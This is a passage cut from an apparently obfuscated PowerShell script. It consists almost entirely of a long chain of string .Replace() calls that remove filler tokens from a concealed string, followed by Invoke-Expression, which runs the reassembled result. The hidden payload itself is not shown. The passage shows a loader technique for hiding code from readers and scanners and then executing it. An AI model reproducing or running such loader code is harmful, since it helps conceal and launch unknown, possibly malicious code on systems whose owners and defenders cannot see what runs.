"").Replace("ID19 7K3li4", "").Replace("ID20 clXVQ", "").Replace("ID21 qmjv", "").Replace("ID22 Lqj7", "").Replace("ID23 7MWhdq", "").Replace("ID24 iKAz", "").Replace("ID25 pScLyBA", "").Replace("ID26 KbSf9P", "").Replace("ID27 bIHrOrF", "").Replace("ID28 Qbp0lb", "").Replace("ID29 mEUGQtZ", "").Replace("ID30 ADT", "").Replace("ID31 QW3", "").Replace("ID32 eNle", "").Replace("ID33 d88s", "").Replace("ID34 tYU6", "").Replace("ID35 geNe", "").Replace("ID36 ao8aX16", "").Replace("ID37 6VdYd", "").Replace("ID38 E0ke", "").Replace("ID39 xDO", "").Replace("ID40 ijaYOCw", "").Replace("ID41 6viN", "").Replace("ID42 DH2yZ3", "").Replace("ID43 DtT", "").Replace("ID44 O9y", "").Replace("ID45 ODvu", "").Replace("ID46 G5E", "").Replace("ID47 F8beh7", "").Replace("ID48 QjzI", "").Replace("ID49 TljO", "").Replace("ID50 qHw", "").Replace("ID51 stTrRz", "").Replace("ID52 mqdJ", "").Replace("ID53 3Gv", "").Replace("ID54 De7", "").Replace("ID55 E4p", "").Replace("ID56 kAFx", "").Replace("ID57 dCeIGe", "").Replace("ID58 2axFFSW", "").Replace("ID59 UGEhp", "").Replace("ID60 5YG", "").Replace("ID61 J5B", "").Replace("ID62 Ue8S", "").Replace("ID63 BX5Lv8S", "").Replace("ID64 Ksapizg", "").Replace("ID65 RsTom", "").Replace("ID66 vwhv7", "").Replace("ID67 X9R", "").Replace("ID68 b2Ob6", "").Replace("ID69 QFyggJ", "").Replace("ID70 QKb4E", "").Replace("ID71 hWnQl", "").Replace("ID72 iDgDJ", "").Replace("ID73 Aif", "").Replace("ID74 VcfzGA", "").Replace("ID75 wJltNiS", "").Replace("ID76 55Ngvn", "").Replace("ID77 wabO", "").Replace("ID78 FSko", "").Replace("ID79 9vH", "").Replace("ID80 Fmx", "").Replace("ID81 8HQWW8W", "").Replace("ID82 rcX", "").Replace("ID83 6s0J6IT", "").Replace("ID84 yiCo9", "").Replace("ID85 kVHnt0B", "").Replace("ID86 1wTo9vU", "").Replace("ID87 89llhvL", "").Replace("ID88 f2NS7Vy", "").Replace("ID89 RVp", "").Replace("ID90 ZvA", "").Replace("ID91 y8NK", "").Replace("ID92 lbn", "").Replace("ID93 IC51c", "").Replace("ID94 dZ2c1IA", "").Replace("ID95 nGa5", "").Replace("ID96 RwX11Y8", "").Replace("ID97 ZAz", "").Replace("ID98 oa9Q", "").Replace("ID99 mvsdPan", "").Replace("ID100 KS2", "").Replace("ID101 NKf5P", "").Replace("ID102 5A8s", "").Replace("ID103 lDUYn", "").Replace("ID104 OmhL", "").Replace("ID105 nJOME", "").Replace("ID106 KNx", "").Replace("ID107 0nZm", "").Replace("ID108 7Uh", "").Replace("ID109 CbJQ4m3", "").Replace("ID110 dRrpX", "").Replace("ID111 Mkhh8o", "").Replace("ID112 y0NeH", "").Replace("ID113 3HBc", "").Replace("ID114 4Il1jv", "").Replace("ID115 1rfMBYW", "").Replace("ID116 ij7Up7f", "").Replace("ID117 70YQB", "").Replace("ID118 zmQ", "").Replace("ID119 S41p", "").Replace("ID120 fKfISo8", "").Replace("ID121 00BRzye", "").Replace("ID122 5rQDbw", "").Replace("ID123 ecF", "").Replace("ID124 ZiHP9", "").Replace("ID125 LLYFdF", "").Replace("ID126 pzKOW", "").Replace("ID127 AG6fed", "").Replace("ID128 LY0z", "").Replace("ID129 PsE", "").Replace("ID130 aMJAt", "").Replace("ID131 IDj", "").Replace("ID132 WXNzE7", "").Replace("ID133 wYQSr", "").Replace("ID134 W2yAdv", "").Replace("ID135 5h0L6", "").Replace("ID136 XBSwfI", "").Replace("ID137 aGHp3l", "").Replace("ID138 QWVEDa2", "").Replace("ID139 oeFp", "").Replace("ID140 sNOOES", "").Replace("ID141 pMD1cr", "").Replace("ID142 OTpLFw", "").Replace("ID143 YVG5FN", "").Replace("ID144 m5GI", "").Replace("ID145 m2Bx", "").Replace("ID146 u9DHD", "").Replace("ID147 7z6s9", "").Replace("ID148 Unj5jb0", "").Replace("ID149 ex8Fp", "").Replace("ID150 h6Od7US", "").Replace("ID151 qQ5", "").Replace("ID152 4myyi", "").Replace("ID153 Lx12", "").Replace("ID154 9HwBxTY", "").Replace("ID155 QW8ZpK", "").Replace("ID156 eDTdO0W", "").Replace("ID157 eQcF", "").Replace("ID158 5fIhZ6", "").Replace("ID159 gIc", "").Replace("ID160 wtoD3", "").Replace("ID161 mL5ES", "").Replace("ID162 e3D", "").Replace("ID163 aygNHU", "").Replace("ID164 CHILkD", "").Replace("ID165 SGp", "").Replace("ID166 gzkf59", "").Replace("ID167 f4ra8", "").Replace("ID168 6ORhL", "").Replace("ID169 vvOi4ch", "").Replace("ID170 vFl2uL", "").Replace("ID171 SVlR", "").Replace("ID172 H0rH", "").Replace("ID173 0EATj2", "").Replace("ID174 HHLv", "").Replace("ID175 Kr9b", "").Replace("ID176 uFFXpt", "").Replace("ID177 1vdOs7b", "").Replace("ID178 cAkbr16", "").Replace("ID179 1Teh", "").Replace("ID180 xkia", "").Replace("ID181 unE", "").Replace("ID182 LKtfPe", "").Replace("ID183 1bpKFr", "").Replace("ID184 kMTi", "").Replace("ID185 sykLij", "").Replace("ID186 CJhDi", "").Replace("ID187 FTbCF6t", "").Replace("ID188 PVXWL5f", "").Replace("ID189 MAyW", "").Replace("ID190 GzLj", "").Replace("ID191 gnNB1TE", "").Replace("ID192 NvqoCGe", "").Replace("ID193 wtD1s", "").Replace("ID194 nwX", "").Replace("ID195 Sknvb", "").Replace("ID196 xoDcZ", "").Replace("ID197 pYDFH1e", "").Replace("ID198 0ZMrw", "").Replace("ID199 YXP", "")
	Invoke-Expression $I8tjm
}
